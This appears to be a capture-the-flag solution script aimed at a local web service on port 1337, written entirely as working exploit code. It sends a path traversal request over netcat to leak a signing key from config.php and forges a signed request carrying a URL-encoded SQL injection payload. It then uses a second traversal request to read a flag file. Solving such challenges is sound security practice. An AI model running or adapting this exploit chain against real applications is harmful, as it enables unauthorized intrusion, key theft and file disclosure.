PAYLOAD='/api/animal/`,imagedir%2520from%2520(select%25201%2520as%2520`%2527`,0x676c6f623a2f2f2f662a%2520as%2520imagedir)x;/fields/%255c%253f%2500%2523x'
KEY=$((printf 'GET http://x?/static/../config.php$ HTTP/1.1\r\nHost: localhost:1337\r\n\r\n'; sleep 1) | netcat -w 3 localhost 1337 | grep -oE '[a-f0-9]{32}')
SIG=$(php sign.php "$KEY" "$PAYLOAD")
FLAGPATH=$(curl --path-as-is -H "X-Signature: $SIG" 'http://localhost:1337/index.php'"$PAYLOAD" | grep -oE 'flag-\w+\.txt')

(printf 'GET http://x?/static/../../../../../../../../../../'"$FLAGPATH"' HTTP/1.1\r\nHost: localhost:1337\r\n\r\n'; sleep 1) | netcat -w 3 localhost 1337